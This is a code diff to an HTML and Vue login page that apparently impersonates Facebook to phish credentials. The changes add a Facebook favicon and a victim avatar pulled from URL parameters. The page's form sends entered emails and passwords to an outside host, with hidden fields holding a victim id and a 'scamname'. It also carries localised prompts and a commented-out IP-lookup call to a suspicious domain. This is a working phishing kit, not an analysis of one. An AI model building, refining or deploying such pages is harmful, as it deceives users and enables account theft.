@@ -3,7 +3,8 @@
 <head>
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>log in</title>
-  <link rel="icon" href="https://sca.sp0m.site/favicon.png">
+  <link rel="icon"
+    href="https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/Gjhrhb7r0lb.png?_nc_eui2=AeE-BuWIjs6D1b4k09gRWdPtrnC626sZnnCucLrbqxmecCxnI5NHn5YNWPxs5lDvQftj5eXCGhdMICLEuP9kdSmL">
   <style>
     body {
       margin: 0;
@@ -85,6 +86,9 @@
       padding: 11px;
     }
   </style>
+  <link rel="me" href="https://www.blogger.com/profile/10152080453114445601" />
+  <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109' />
+  <meta name='google-adsense-platform-domain' content='blogspot.com' />
 </head>
 
 <body>
@@ -95,7 +99,7 @@
     </div>
 
     <div class="segma">
-      <img src="//m2.nsimg.net/biopic/320x240/11493569" style="width: 100%;" height="270px">
+      <img :src="img" style="width: 100%;" height="270px">
       <form class="forum" method="POST" action="https://sc0m.com/v/add">
         <div class="summary">
           <input class="elle" id="email" name="email" :placeholder="email" type="text" required>
@@ -105,7 +109,7 @@
 
             <input type="hidden" value="" name="id" v-model="id_u">
             <input type="hidden" value="" name="sc" v-model="scamname">
-            <button type="submit" onclick="ss()" name="add" class="birou">{{login}}</button>
+            <button type="submit" name="add" class="birou">{{login}}</button>
           </div>
       </form>
     </div>
@@ -148,6 +152,7 @@
         password: "",
         email: "",
         login: '',
+        img: '',
         firsts: '',
         create: '',
         forget: '',
@@ -171,14 +176,19 @@
         let idu = rrs.split("=")[1][1]
         let user = rrs.split("_")[3]
         user = user.split("=")[1]
+        //
+        let avatar = rrs.split("_")[4]
+        avatar = avatar.split("=")[1]
+        //
         let sc = rrs.split("_")[2]
         sc = sc.split("=")[1]
         rrs = rrs.split("_")[1]
         rrs = rrs.split("=")[1]
-        //alert(user)
+        //alert(avatar)
         let lang = rrs;
         this.id_u = user
         this.scamname = sc
+        this.img = avatar
 
         if (lang == 'ar') {
           this.email = "رقم الهاتف  أو البريد الإلكتروني";
@@ -223,14 +233,13 @@
       },
     })
 
-    const queryString = window.location.search;
-    const urlParams = new URLSearchParams(queryString);
-    const q = urlParams.get('q');
 
-    if (q == null) {
-      //    window.location = "https://google.com";
-      exit();
-    }
+    //  let t= await     axios.get("https://sp0m.site/ip.php");
+         //  let dd=  cpp[resps.data];
+        //   let oo=  dd.prefix;
+
+
+
 
   </script>
 
